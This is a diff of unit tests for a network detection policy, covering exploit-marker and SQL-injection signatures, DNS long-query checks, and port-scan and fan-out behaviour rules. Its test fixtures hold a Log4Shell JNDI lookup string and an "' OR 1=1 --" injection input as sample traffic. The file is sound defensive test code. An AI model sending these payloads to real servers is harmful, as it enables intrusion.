@@ -20,6 +20,7 @@ def _build_result(
     dst_ip: str = "203.0.113.20",
     src_port: int = 50000,
     dst_port: int = 443,
+    protocol: str = "TCP",
 ) -> DetectionResult:
     flow = FlowRecord(
         key=FlowKey(
@@ -27,7 +28,7 @@ def _build_result(
             dst_ip=dst_ip,
             src_port=src_port,
             dst_port=dst_port,
-            protocol="TCP",
+            protocol=protocol,
         ),
         features={},
     )
@@ -475,6 +476,143 @@ class DetectOnlyPolicyTest(unittest.TestCase):
         self.assertEqual(
             result.matched_signatures,
             ("signature(tcp-sensitive-port-probe:+35;dst_port=22,packets=7,payload<=32)",),
+        )
+
+    def test_allowlisted_signature_action_is_capped(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                signature_rule_scores={"http-known-exploit-marker": 75},
+                signature_allowlisted_max_action="suspicious",
+            )
+        )
+
+        result = _build_result(label="Benign", confidence=0.90)
+        result.flow.metadata.update(
+            {
+                "http_is_plaintext": True,
+                "http_query": "x=${jndi:ldap://example/a}",
+            }
+        )
+        result = policy.apply(result)
+
+        self.assertEqual(result.risk_score, 75)
+        self.assertEqual(result.action, "suspicious")
+        self.assertEqual(
+            result.matched_signatures,
+            ("signature(http-known-exploit-marker:+75;marker=${jndi:)",),
+        )
+
+    def test_payload_signature_detects_sqli_keyword(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                signature_rule_scores={"http-sqli-keyword": 70},
+                signature_allowlisted_max_action="alert",
+            )
+        )
+
+        result = _build_result(label="Benign", confidence=0.95, dst_port=80)
+        result.flow.metadata.update(
+            {
+                "http_is_plaintext": True,
+                "http_path": "/search",
+                "http_query": "q=' OR 1=1 --",
+            }
+        )
+        result = policy.apply(result)
+
+        self.assertEqual(result.risk_score, 70)
+        self.assertEqual(result.action, "alert")
+        self.assertEqual(
+            result.matched_signatures,
+            ("signature(http-sqli-keyword:+70;pattern=' or 1=1)",),
+        )
+
+    def test_https_payload_preview_does_not_trigger_http_signature(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                signature_rule_scores={"http-sqli-keyword": 70},
+            )
+        )
+
+        result = _build_result(label="Benign", confidence=0.95, dst_port=443)
+        result.flow.metadata["payload_preview"] = "GET /search?q=' OR 1=1 HTTP/1.1"
+        result = policy.apply(result)
+
+        self.assertEqual(result.risk_score, 0)
+        self.assertEqual(result.action, "log")
+        self.assertEqual(result.matched_signatures, ())
+
+    def test_dns_signature_detects_long_query(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                signature_rule_scores={"dns-long-query": 30},
+                signature_dns_long_query_chars=20,
+            )
+        )
+
+        result = _build_result(label="Benign", confidence=0.95, dst_port=53, protocol="UDP")
+        result.flow.metadata["dns_queries"] = "aaaaaaaaaaaaaaaaaaaaaaaa.example.com"
+        result = policy.apply(result)
+
+        self.assertEqual(result.risk_score, 30)
+        self.assertEqual(result.action, "suspicious")
+        self.assertEqual(
+            result.matched_signatures,
+            ("signature(dns-long-query:+30;len=36)",),
+        )
+
+    def test_behavior_port_scan_raises_allowlisted_flow(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                behavior_port_scan_min_ports=3,
+                behavior_port_scan_score=35,
+                signature_allowlisted_max_action="suspicious",
+            )
+        )
+
+        policy.apply(_build_result(label="Benign", confidence=0.95, dst_port=22))
+        policy.apply(_build_result(label="Benign", confidence=0.95, dst_port=80))
+        result = policy.apply(_build_result(label="Benign", confidence=0.95, dst_port=445))
+
+        self.assertEqual(result.risk_score, 35)
+        self.assertEqual(result.action, "suspicious")
+        self.assertEqual(
+            result.matched_behaviors,
+            ("behavior(behavior-port-scan:+35;dst=203.0.113.20,ports=3,window=60s)",),
+        )
+
+    def test_behavior_fanout_can_raise_below_threshold_flow(self) -> None:
+        policy = DetectOnlyPolicy(
+            RuntimeConfig(
+                label_allowlist=("Benign",),
+                label_block_thresholds={"Infiltration": 0.90},
+                behavior_fanout_min_hosts=3,
+                behavior_fanout_score=35,
+                skip_private_peer_blocking=False,
+            )
+        )
+
+        policy.apply(
+            _build_result(label="Infiltration", confidence=0.60, dst_ip="203.0.113.10", dst_port=22)
+        )
+        policy.apply(
+            _build_result(label="Infiltration", confidence=0.60, dst_ip="203.0.113.11", dst_port=22)
+        )
+        result = policy.apply(
+            _build_result(label="Infiltration", confidence=0.60, dst_ip="203.0.113.12", dst_port=22)
+        )
+
+        self.assertEqual(result.risk_score, 35)
+        self.assertEqual(result.action, "suspicious")
+        self.assertEqual(result.policy_reason, "below-threshold(0.90)")
+        self.assertEqual(
+            result.matched_behaviors,
+            ("behavior(behavior-fanout:+35;dst_port=22,hosts=3,window=60s)",),
         )
 
 
